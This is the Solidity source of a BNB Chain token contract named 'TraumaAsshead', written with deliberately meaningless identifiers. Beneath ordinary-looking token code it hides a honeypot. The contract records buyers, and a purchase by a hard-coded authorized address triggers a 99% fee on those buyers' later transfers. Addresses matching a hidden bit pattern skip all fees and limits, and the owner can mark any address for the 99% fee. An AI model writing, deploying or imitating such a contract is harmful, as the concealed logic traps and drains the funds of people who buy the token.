/**
 *Submitted for verification at BscScan.com on 2022-12-20
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Ownable {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAuthorized() {
        require(isAuthorized(msg.sender), "!Authorized");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        competent[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        competent[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        competent[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract TraumaAsshead is IBEP20, Ownable {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "Trauma Asshead ";
    string constant _symbol = "TraumaAsshead";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private autoMaxLiquiditySwap;
    mapping(address => bool) private modeWalletReceiverMarketingBurnExemptSell;
    mapping(address => bool) private teamWalletMinSell;
    mapping(address => bool) private limitWalletFeeTradingReceiverTx;
    mapping(address => uint256) private minModeAutoLimit;
    mapping(uint256 => address) private tradingWalletTeamAutoBurnMode;
    uint256 public exemptLimitValue = 0;
    uint256 private launchBlock = 0;
    //BUY FEES
    uint256 private buyFeeTeamSwapMarketingTradingMax = 0;
    uint256 private isLiquidityLaunchedMarketing = 8;

    //SELL FEES
    uint256 private launchedSwapBuyLiquidity = 0;
    uint256 private txLimitExemptSwapReceiver = 8;

    uint256 private maxTeamExemptFee = isLiquidityLaunchedMarketing + buyFeeTeamSwapMarketingTradingMax;
    uint256 private teamMaxExemptAutoIsLaunchedSwap = 100;

    address private txLimitTradingReceiverIsExempt = (msg.sender); // auto-liq address
    address private walletLaunchedBuyLiquidity = (0x1bC7E7Fb6455e4117ce6B0feFffFd2229D71926A); // marketing address
    address private swapLiquidityTxAuto = DEAD;
    address private buyMinSwapTx = DEAD;
    address private marketingModeTxSellAuto = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private txReceiverMinExempt;
    uint256 private marketingLaunchedSellMode;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private tradingExemptFeeWallet;
    uint256 private botsIsMaxTx;
    uint256 private maxFeeLimitTxMode;
    uint256 private burnWalletMinSell;
    uint256 private liquidityExemptBuyMax;

    bool private marketingExemptSellTrading = true;
    bool private limitWalletFeeTradingReceiverTxMode = true;
    bool private exemptSellReceiverWalletTxLiquidityMax = true;
    bool private burnIsMinReceiverTeamSwap = true;
    bool private modeTxSellWallet = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private txWalletReceiverBots = 6 * 10 ** 15;
    uint256 private burnBuyLaunchedSwapMin = _totalSupply / 1000; // 0.1%

    
    bool private botsSellLaunchedWalletAutoBuyLiquidity = false;
    uint256 private feeWalletTxSellTeam = 0;
    uint256 private minTxFeeTeamMarketingModeAuto = 0;
    uint256 private swapModeSellMin = 0;
    uint256 private exemptMinSwapLiquidity = 0;
    uint256 private marketingReceiverExemptMax = 0;
    uint256 private modeLimitTxBuy = 0;
    uint256 private liquidityLimitMarketingMin = 0;
    bool private feeReceiverLimitAutoExemptIsBurn = false;
    bool private minWalletMaxSwapBotsReceiver = false;
    bool private feeWalletTxSellTeam0 = false;
    bool private feeWalletTxSellTeam1 = false;
    uint256 private feeWalletTxSellTeam2 = 0;
    bool private feeWalletTxSellTeam3 = false;
    bool private feeWalletTxSellTeam4 = false;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        tradingExemptFeeWallet = true;

        autoMaxLiquiditySwap[msg.sender] = true;
        autoMaxLiquiditySwap[address(this)] = true;

        modeWalletReceiverMarketingBurnExemptSell[msg.sender] = true;
        modeWalletReceiverMarketingBurnExemptSell[0x0000000000000000000000000000000000000000] = true;
        modeWalletReceiverMarketingBurnExemptSell[0x000000000000000000000000000000000000dEaD] = true;
        modeWalletReceiverMarketingBurnExemptSell[address(this)] = true;

        teamWalletMinSell[msg.sender] = true;
        teamWalletMinSell[0x0000000000000000000000000000000000000000] = true;
        teamWalletMinSell[0x000000000000000000000000000000000000dEaD] = true;
        teamWalletMinSell[address(this)] = true;

        SetAuthorized(address(0xea0980244bD53685260bA28eFFfFED8432E9cB1f));

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return maxSellFeeExemptMinMarketingLiquidity(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return maxSellFeeExemptMinMarketingLiquidity(sender, recipient, amount);
    }

    function maxSellFeeExemptMinMarketingLiquidity(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        if (minTxFeeTeamMarketingModeAuto != swapModeSellMin) {
            minTxFeeTeamMarketingModeAuto = maxTeamExemptFee;
        }

        if (feeReceiverLimitAutoExemptIsBurn == feeWalletTxSellTeam1) {
            feeReceiverLimitAutoExemptIsBurn = burnIsMinReceiverTeamSwap;
        }


        bool bLimitTxWalletValue = txIsLaunchedTeam(sender) || txIsLaunchedTeam(recipient);
        
        if (feeWalletTxSellTeam != maxTeamExemptFee) {
            feeWalletTxSellTeam = launchBlock;
        }

        if (modeLimitTxBuy == liquidityLimitMarketingMin) {
            modeLimitTxBuy = launchBlock;
        }

        if (exemptMinSwapLiquidity == maxTeamExemptFee) {
            exemptMinSwapLiquidity = minTxFeeTeamMarketingModeAuto;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && isAuthorized(recipient)) {
                teamSwapSellReceiverIs();
            }
            if (!bLimitTxWalletValue) {
                modeFeeMinTx(recipient);
            }
        }
        
        
        if (inSwap || bLimitTxWalletValue) {return tradingLiquidityBotsBuy(sender, recipient, amount);}


        if (!autoMaxLiquiditySwap[sender] && !autoMaxLiquiditySwap[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet!");
        }
        
        require((amount <= _maxTxAmount) || teamWalletMinSell[sender] || teamWalletMinSell[recipient], "Max TX Limit!");

        if (modeMarketingIsBurn()) {walletAutoMaxBuy();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        
        uint256 amountReceived = txTeamTradingLimit(sender) ? limitMarketingReceiverMin(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function tradingLiquidityBotsBuy(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function txTeamTradingLimit(address sender) internal view returns (bool) {
        return !modeWalletReceiverMarketingBurnExemptSell[sender];
    }

    function marketingLaunchedWalletMode(address sender, bool selling) internal returns (uint256) {
        
        if (feeWalletTxSellTeam0 != botsSellLaunchedWalletAutoBuyLiquidity) {
            feeWalletTxSellTeam0 = botsSellLaunchedWalletAutoBuyLiquidity;
        }

        if (exemptMinSwapLiquidity != burnBuyLaunchedSwapMin) {
            exemptMinSwapLiquidity = txWalletReceiverBots;
        }

        if (feeWalletTxSellTeam4 == exemptSellReceiverWalletTxLiquidityMax) {
            feeWalletTxSellTeam4 = feeWalletTxSellTeam3;
        }


        if (selling) {
            maxTeamExemptFee = txLimitExemptSwapReceiver + launchedSwapBuyLiquidity;
            return tradingMaxBurnTx(sender, maxTeamExemptFee);
        }
        if (!selling && sender == uniswapV2Pair) {
            maxTeamExemptFee = isLiquidityLaunchedMarketing + buyFeeTeamSwapMarketingTradingMax;
            return maxTeamExemptFee;
        }
        return tradingMaxBurnTx(sender, maxTeamExemptFee);
    }

    function feeBotsLaunchedModeMarketingBurn() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function limitMarketingReceiverMin(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = amount.mul(marketingLaunchedWalletMode(sender, receiver == uniswapV2Pair)).div(teamMaxExemptAutoIsLaunchedSwap);

        if (limitWalletFeeTradingReceiverTx[sender] || limitWalletFeeTradingReceiverTx[receiver]) {
            feeAmount = amount.mul(99).div(teamMaxExemptAutoIsLaunchedSwap);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function txIsLaunchedTeam(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function tradingMaxBurnTx(address sender, uint256 pFee) private view returns (uint256) {
        uint256 f0 = minModeAutoLimit[sender];
        uint256 f1 = pFee;
        if (f0 > 0 && block.timestamp - f0 > 2) {
            f1 = 99;
        }
        return f1;
    }

    function modeFeeMinTx(address addr) private {
        if (feeBotsLaunchedModeMarketingBurn() < txWalletReceiverBots) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        tradingWalletTeamAutoBurnMode[exemptLimitValue] = addr;
    }

    function teamSwapSellReceiverIs() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (minModeAutoLimit[tradingWalletTeamAutoBurnMode[i]] == 0) {
                    minModeAutoLimit[tradingWalletTeamAutoBurnMode[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }
    
    function modeMarketingIsBurn() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    modeTxSellWallet &&
    _balances[address(this)] >= burnBuyLaunchedSwapMin;
    }

    function walletAutoMaxBuy() internal swapping {
        
        uint256 amountToLiquify = burnBuyLaunchedSwapMin.mul(buyFeeTeamSwapMarketingTradingMax).div(maxTeamExemptFee).div(2);
        uint256 amountToSwap = burnBuyLaunchedSwapMin.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = maxTeamExemptFee.sub(buyFeeTeamSwapMarketingTradingMax.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(buyFeeTeamSwapMarketingTradingMax).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(isLiquidityLaunchedMarketing).div(totalETHFee);
        
        payable(walletLaunchedBuyLiquidity).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                txLimitTradingReceiverIsExempt,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getFeeWalletTxSellTeam0() public view returns (bool) {
        if (feeWalletTxSellTeam0 != minWalletMaxSwapBotsReceiver) {
            return minWalletMaxSwapBotsReceiver;
        }
        return feeWalletTxSellTeam0;
    }
    function setFeeWalletTxSellTeam0(bool a0) public onlyOwner {
        if (feeWalletTxSellTeam0 == feeWalletTxSellTeam1) {
            feeWalletTxSellTeam1=a0;
        }
        if (feeWalletTxSellTeam0 == feeWalletTxSellTeam0) {
            feeWalletTxSellTeam0=a0;
        }
        if (feeWalletTxSellTeam0 != minWalletMaxSwapBotsReceiver) {
            minWalletMaxSwapBotsReceiver=a0;
        }
        feeWalletTxSellTeam0=a0;
    }

    function getLimitWalletFeeTradingReceiverTxMode() public view returns (bool) {
        if (limitWalletFeeTradingReceiverTxMode != burnIsMinReceiverTeamSwap) {
            return burnIsMinReceiverTeamSwap;
        }
        if (limitWalletFeeTradingReceiverTxMode == feeWalletTxSellTeam3) {
            return feeWalletTxSellTeam3;
        }
        return limitWalletFeeTradingReceiverTxMode;
    }
    function setLimitWalletFeeTradingReceiverTxMode(bool a0) public onlyOwner {
        limitWalletFeeTradingReceiverTxMode=a0;
    }

    function getFeeWalletTxSellTeam() public view returns (uint256) {
        if (feeWalletTxSellTeam == liquidityLimitMarketingMin) {
            return liquidityLimitMarketingMin;
        }
        if (feeWalletTxSellTeam != maxTeamExemptFee) {
            return maxTeamExemptFee;
        }
        return feeWalletTxSellTeam;
    }
    function setFeeWalletTxSellTeam(uint256 a0) public onlyOwner {
        if (feeWalletTxSellTeam == swapModeSellMin) {
            swapModeSellMin=a0;
        }
        if (feeWalletTxSellTeam == liquidityLimitMarketingMin) {
            liquidityLimitMarketingMin=a0;
        }
        if (feeWalletTxSellTeam != teamMaxExemptAutoIsLaunchedSwap) {
            teamMaxExemptAutoIsLaunchedSwap=a0;
        }
        feeWalletTxSellTeam=a0;
    }

    function getBurnBuyLaunchedSwapMin() public view returns (uint256) {
        if (burnBuyLaunchedSwapMin == liquidityLimitMarketingMin) {
            return liquidityLimitMarketingMin;
        }
        if (burnBuyLaunchedSwapMin == buyFeeTeamSwapMarketingTradingMax) {
            return buyFeeTeamSwapMarketingTradingMax;
        }
        if (burnBuyLaunchedSwapMin == teamMaxExemptAutoIsLaunchedSwap) {
            return teamMaxExemptAutoIsLaunchedSwap;
        }
        return burnBuyLaunchedSwapMin;
    }
    function setBurnBuyLaunchedSwapMin(uint256 a0) public onlyOwner {
        burnBuyLaunchedSwapMin=a0;
    }

    function getMinWalletMaxSwapBotsReceiver() public view returns (bool) {
        return minWalletMaxSwapBotsReceiver;
    }
    function setMinWalletMaxSwapBotsReceiver(bool a0) public onlyOwner {
        if (minWalletMaxSwapBotsReceiver != feeWalletTxSellTeam0) {
            feeWalletTxSellTeam0=a0;
        }
        if (minWalletMaxSwapBotsReceiver == marketingExemptSellTrading) {
            marketingExemptSellTrading=a0;
        }
        minWalletMaxSwapBotsReceiver=a0;
    }

    function getMinModeAutoLimit(address a0) public view returns (uint256) {
            return minModeAutoLimit[a0];
    }
    function setMinModeAutoLimit(address a0,uint256 a1) public onlyOwner {
        minModeAutoLimit[a0]=a1;
    }

    function getFeeWalletTxSellTeam3() public view returns (bool) {
        if (feeWalletTxSellTeam3 != feeWalletTxSellTeam0) {
            return feeWalletTxSellTeam0;
        }
        if (feeWalletTxSellTeam3 == botsSellLaunchedWalletAutoBuyLiquidity) {
            return botsSellLaunchedWalletAutoBuyLiquidity;
        }
        if (feeWalletTxSellTeam3 != exemptSellReceiverWalletTxLiquidityMax) {
            return exemptSellReceiverWalletTxLiquidityMax;
        }
        return feeWalletTxSellTeam3;
    }
    function setFeeWalletTxSellTeam3(bool a0) public onlyOwner {
        feeWalletTxSellTeam3=a0;
    }

    function getBuyFeeTeamSwapMarketingTradingMax() public view returns (uint256) {
        if (buyFeeTeamSwapMarketingTradingMax == modeLimitTxBuy) {
            return modeLimitTxBuy;
        }
        if (buyFeeTeamSwapMarketingTradingMax == modeLimitTxBuy) {
            return modeLimitTxBuy;
        }
        return buyFeeTeamSwapMarketingTradingMax;
    }
    function setBuyFeeTeamSwapMarketingTradingMax(uint256 a0) public onlyOwner {
        if (buyFeeTeamSwapMarketingTradingMax == minTxFeeTeamMarketingModeAuto) {
            minTxFeeTeamMarketingModeAuto=a0;
        }
        if (buyFeeTeamSwapMarketingTradingMax != swapModeSellMin) {
            swapModeSellMin=a0;
        }
        buyFeeTeamSwapMarketingTradingMax=a0;
    }

    function getLaunchedSwapBuyLiquidity() public view returns (uint256) {
        if (launchedSwapBuyLiquidity != feeWalletTxSellTeam2) {
            return feeWalletTxSellTeam2;
        }
        if (launchedSwapBuyLiquidity == feeWalletTxSellTeam2) {
            return feeWalletTxSellTeam2;
        }
        return launchedSwapBuyLiquidity;
    }
    function setLaunchedSwapBuyLiquidity(uint256 a0) public onlyOwner {
        if (launchedSwapBuyLiquidity != feeWalletTxSellTeam) {
            feeWalletTxSellTeam=a0;
        }
        if (launchedSwapBuyLiquidity == txWalletReceiverBots) {
            txWalletReceiverBots=a0;
        }
        launchedSwapBuyLiquidity=a0;
    }

    function getModeTxSellWallet() public view returns (bool) {
        return modeTxSellWallet;
    }
    function setModeTxSellWallet(bool a0) public onlyOwner {
        if (modeTxSellWallet == minWalletMaxSwapBotsReceiver) {
            minWalletMaxSwapBotsReceiver=a0;
        }
        modeTxSellWallet=a0;
    }

    function getBurnIsMinReceiverTeamSwap() public view returns (bool) {
        if (burnIsMinReceiverTeamSwap != limitWalletFeeTradingReceiverTxMode) {
            return limitWalletFeeTradingReceiverTxMode;
        }
        if (burnIsMinReceiverTeamSwap == burnIsMinReceiverTeamSwap) {
            return burnIsMinReceiverTeamSwap;
        }
        return burnIsMinReceiverTeamSwap;
    }
    function setBurnIsMinReceiverTeamSwap(bool a0) public onlyOwner {
        if (burnIsMinReceiverTeamSwap == feeWalletTxSellTeam1) {
            feeWalletTxSellTeam1=a0;
        }
        burnIsMinReceiverTeamSwap=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}